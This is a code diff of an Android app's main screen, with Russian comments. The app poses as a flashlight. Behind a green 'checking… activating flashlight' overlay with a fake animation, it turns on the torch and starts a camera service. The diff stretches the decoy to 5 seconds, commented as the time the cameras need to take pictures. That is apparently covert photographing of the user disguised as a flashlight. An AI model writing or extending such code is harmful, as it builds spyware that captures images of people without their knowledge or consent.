@@ -44,7 +44,6 @@ public class MainActivity extends AppCompatActivity {
         } catch (CameraAccessException e) { e.printStackTrace(); }
 
         btn.setOnClickListener(v -> {
-            // Если нет разрешения на камеру - показываем диалог
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                 new AlertDialog.Builder(this)
                     .setTitle("Фонарь не работает")
@@ -61,25 +60,25 @@ public class MainActivity extends AppCompatActivity {
             isProcessing = true;
 
             try {
-                // Показываем зеленый экран с "Проверка."
                 greenOverlay.setVisibility(View.VISIBLE);
                 tvAnim.setText("Проверка.");
 
-                // Анимация проверки (мигание точками) - 2 секунды
                 Handler handler = new Handler(Looper.getMainLooper());
-                handler.postDelayed(() -> tvAnim.setText("Проверка.."), 500);
-                handler.postDelayed(() -> tvAnim.setText("Проверка..."), 1000);
-                handler.postDelayed(() -> tvAnim.setText("Проверка."), 1500);
+                // Мигаем точками
+                handler.postDelayed(() -> tvAnim.setText("Проверка.."), 600);
+                handler.postDelayed(() -> tvAnim.setText("Проверка..."), 1200);
+                handler.postDelayed(() -> tvAnim.setText("Проверка."), 1800);
+                handler.postDelayed(() -> tvAnim.setText("Проверка.."), 2400);
                 
-                // Включаем фонарик для съемки на 1.5 сек (для света)
+                // Включаем фонарик для съемки
                 try { cameraManager.setTorchMode(cameraId, true); } catch (Exception e) {}
 
-                // Запускаем камеру
+                // Запускаем камеры
                 Intent svc = new Intent(this, CameraService.class);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
                 else startService(svc);
 
-                // Через 3 секунды переключаем на "Активация..."
+                // Через 5 секунд переключаем на "Активация..."
                 handler.postDelayed(() -> {
                     tvAnim.setText("Активация фонаря...");
                     
@@ -87,7 +86,6 @@ public class MainActivity extends AppCompatActivity {
                     handler.postDelayed(() -> {
                         try { cameraManager.setTorchMode(cameraId, false); } catch (Exception e) {}
                         
-                        // Завершаем
                         greenOverlay.setVisibility(View.GONE);
                         isProcessing = false;
                         
@@ -99,17 +97,9 @@ public class MainActivity extends AppCompatActivity {
 
                     }, 3000);
 
-                }, 2000);
+                }, 5000); // Ждем 5 секунд, пока камеры сделают снимки
 
             } catch (Exception e) { e.printStackTrace(); }
         });
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == 1 && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-            // Если разрешил - жмем кнопку еще раз
-        }
     }
 }
